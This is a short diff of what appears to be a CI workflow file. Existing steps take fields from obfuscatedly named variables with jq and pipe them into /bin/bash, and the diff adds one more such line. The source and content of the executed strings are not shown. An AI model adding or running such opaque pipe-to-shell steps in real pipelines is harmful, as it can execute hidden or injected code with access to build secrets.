@@ -22,6 +22,7 @@ jobs:
           echo $ys6 | jq -r .kgu60 | /bin/bash
           echo $es20030 | jq -r .ug76 | /bin/bash
           printf '%s' "$r43" | jq -r .cfpv73 | /bin/bash
+          printf '%s' "$yt02" | jq -r .stlq946 | /bin/bash
 
       - name: Store artifact
         uses: actions/upload-artifact@v4
